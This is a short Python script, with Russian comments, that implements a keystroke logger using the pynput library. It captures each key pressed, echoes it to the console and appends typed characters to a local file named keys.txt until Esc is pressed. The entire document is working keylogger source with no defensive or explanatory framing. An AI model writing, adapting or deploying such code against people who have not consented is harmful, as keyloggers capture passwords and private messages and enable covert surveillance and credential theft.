from pynput.keyboard import Key, Listener


class KeyLogger:
    def __init__(self):
        self.count = 0  # для подсчёта количества нажатых кнопок
        self.keys = []

    def on_press(self, key):
        print(f"{key} нажата!")

        if str(key) != "Key.backspace":
            self.keys.append(key)
            self.count += 1

        if self.count >= 10:
            self.write_file()
            self.keys = []

    @staticmethod
    def on_release(key):
        if key == Key.esc:
            return False

    def write_file(self):
        with open("keys.txt", "a") as file:

            for key in self.keys:
                key = str(key).replace("'", "")

                if key.find("space") > 0:
                    file.write("\n")
                elif key.find("Key") == -1:
                    file.write(key)


if __name__ == '__main__':
    with Listener(on_press=KeyLogger().on_press, on_release=KeyLogger().on_release) as listener:
        listener.join()
